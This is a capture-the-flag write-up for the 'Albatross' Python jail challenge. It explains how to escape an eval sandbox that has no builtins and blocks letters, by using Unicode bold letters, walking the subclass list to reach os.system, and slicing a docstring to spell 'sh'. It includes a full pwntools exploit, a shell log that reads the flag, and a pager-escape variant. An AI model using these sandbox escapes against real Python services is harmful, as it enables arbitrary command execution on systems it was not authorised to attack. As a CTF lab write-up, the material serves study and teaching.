# Albatross
This was a pyjail golf challenge. We are given the following source code: 
```python
#!/usr/bin/env python3.7
from rctf import golf
import string, os

# NOTE: Although this challenge may seem impossible, rest assured that we have 
# a working solution that would meet the length restriction within the first  
# few days of the CTF. Keep digging!

rate = 2 # bytes per hour
base = 30 # amount to start with
blacklist = string.ascii_letters + '"\' '

if __name__ == '__main__':
    # create banner
    n = golf.calculate_limit(
        'https://staging.redpwn.net/' if os.environ.get('DEBUG') else 'https://2020.redpwn.net/',
        'albatross', # challenge id
        1592769600, # CTF start date
        lambda hours : int(base + (hours * rate))
    )
    
    print(
        'Welcome to Albatross, the pyjail challenge you wish never existed.\n'
        f'* At the moment, you are only permitted to use a payload of {n} bytes or shorter.\n'
        f'* Every hour, the byte restriction will increase by {rate}.\n'
        '* Once the a team solves this challenge, the restriction will stop increasing\n'
        '* The flag is in /flag.txt\n'
        '* Don\'t let b1c get those HackerOne hoodies! Now\'s your chance to stop them with this high-point challenge.\n' # i literally made this challenge to disadvantage b1c btw
    )

    # filter payload
    try:
        payload = ''.join([
            (x if x not in blacklist else '')
            for x in
            input('>>> ')[:n]
        ])
    except (EOFError, KeyboardInterrupt):
        print('\nYou gave up. Understandable.')
        exit()

    # execute payload
    eval(str(payload), {'__builtins__' : None}, {})
```
We have a few restrictions:
* We can not use letters, quotes or spaces. 
* There is a length restriction. This started at 30 bytes and increased by 2 bytes every hour until a team solved it. The final restriction ended up as 102 bytes.
* The builtins are removed.
* We can not see the output.

We will start by bypassing the letter blacklist. Python allows us to use [mathematical alphanumeric symbols](https://en.wikipedia.org/wiki/Mathematical_Alphanumeric_Symbols) as an alternative to normal letters. We will use bold letters.

We will then be looking at what is available in the program. To do this we can run the program locally with the `-i` flag in python to get an interactive shell after the program finishes. 
First we check which classes we have available with:
```python
().__class__.__base__.__subclasses__()
```
We notice we have `<class 'os._wrap_close'>`. This can lead us to recovering `os` followed by `os.system`. To get the class's index we use:
```python
[c.__name__ for c in ().__class__.__base__.__subclasses__()].index('_wrap_close')
```
This gives us 127. Now that we know the index we can recover `os` by accessing the class's global variables in `__init__` like so:
```python
().__class__.__base__.__subclasses__()[127].__init__.__globals__
``` 
Now that we have access to os we can use `os.system` to run system commands. However, `__globals__` is a dictionary and we can not access `system` by the function's name as we can't use quotes. To work around this we will take get the dictionary values and and unpack it into a list. This way we will be able to access it by its index. We now have:
```python
[*().__class__.__base__.__subclasses__()[127].__init__.__globals__.values()][42]
```

The only remaining part now is to give the system command a command to execute. We can't use quotes so we will have to get the string in another way. We can for example use the tuple documentation which contains both an `s` and an `h` and can be combined to `sh` using string slicing.
```python
>>> ().__doc__
"Built-in immutable sequence.\n\nIf no argument is given, the constructor returns an empty tuple.\nIf iterable is specified the tuple is initialized from iterable's items.\n\nIf the argument is a tuple, the return value is the same object."
>>> ().__doc__.index('s')
19
>>> ().__doc__.index('h')
56
>>> ().__doc__[19:57:37]
'sh'
```

Now we just have to put everything together. We end up with a 102 byte payload. The final exploit is:
```python
#!/usr/bin/env python3
from pwn import *

r = remote("2020.redpwnc.tf", 31156)

alphabet_encoded = "𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙"
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
bold_translation = str.maketrans(alphabet, alphabet_encoded)

payload = "[*().__class__.__base__.__subclasses__()[127].__init__.__globals__.values()][42](().__doc__[19:57:37])"
payload = payload.translate(bold_translation)

r.sendlineafter(">>> ", payload)
r.interactive()
```
Running this gives us a shell and we can grab the flag.
```bash
root@kali:~# ./exploit.py 
[+] Opening connection to 2020.redpwnc.tf on port 31156: Done
[*] Switching to interactive mode
$ ls 
albatross.py
bin
boot
dev
etc
flag.txt
home
lib
lib32
lib64
media
mnt
opt
proc
root
run
sbin
srv
start.sh
sys
tmp
usr
var
$ cat flag.txt
flag{SH*T_I_h0pe_ur_n0t_b1c..._if_y0u_@r3,_th1$_isn't_th3_fl@g}
```

## Alternative 48 bytes method
Before we got our final solution we had an alternative way which just required 48 bytes, but this did unfortunately not work on the remote instance as it requires a fully interactive TTY.
The solution is using the help function in python. Python help is using a pager, in our case less, to show help messages. By using the encoded version of the following payload locally we get a shell after we type `!/bin/sh`. On the remote instance it opens the pager but we can not properly interact with it to get a shell. 
```python
().__class__.__base__.__subclasses__()[130]()(1)
```
